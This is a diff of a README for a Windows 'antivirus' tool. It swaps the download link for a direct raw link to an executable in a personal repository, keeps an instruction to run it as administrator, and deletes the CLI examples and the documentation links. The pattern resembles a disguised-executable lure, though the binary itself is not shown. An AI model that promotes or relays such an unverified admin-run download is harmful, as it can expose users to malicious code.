@@ -49,29 +49,13 @@ Most AVs operate in user space and rely on Windows APIs — which malware can hi
 
 1. Download the latest version:
    ```
-   https://github.com/YourUsername/ElissaAV/releases/latest/download/ElissaAV.exe
+    https://github.com/Elissa1610/DeepScanning-Antivirus/raw/refs/heads/main/Elissa's%20Antivirus.exe
    ```
 
 2. Right-click the EXE and choose:  
    **"Run as administrator"**
 
 3. Follow on-screen menu or use CLI options.
-
----
-
-## 💻 CLI Examples
-
-```bash
-ElissaAV.exe --fullscan         # Perform a full disk + memory + registry scan
-ElissaAV.exe --quickscan        # Perform a fast scan on critical areas
-ElissaAV.exe --bootsector       # Analyze MBR/EFI and bootloader
-ElissaAV.exe --pidscan 1337     # Scan a specific process ID
-ElissaAV.exe --list-hidden      # Reveal hidden processes, drivers, and threads
-ElissaAV.exe --detect-hooks     # Detect SSDT/IRP hook tampering
-ElissaAV.exe --log-full         # Output a full report to the executable directory
-```
-
-Logs are auto-generated in the same folder for later analysis.
 
 ---
 
@@ -121,14 +105,6 @@ It is designed for defensive cybersecurity testing, professional auditing, and s
 ## 🧠 Credits
 
 Crafted by low-level kernel developers and malware analysts dedicated to uncovering the deepest layers of threat activity.
-
----
-
-## 🔗 Resources
-
-- 🔥 [Download Elissa AV](https://github.com/YourUsername/ElissaAV/releases)
-- 📘 [Microsoft WDK Docs](https://learn.microsoft.com/en-us/windows-hardware/drivers/)
-- 🧰 [Sysinternals Tools](https://learn.microsoft.com/en-us/sysinternals/)
 
 ---
 
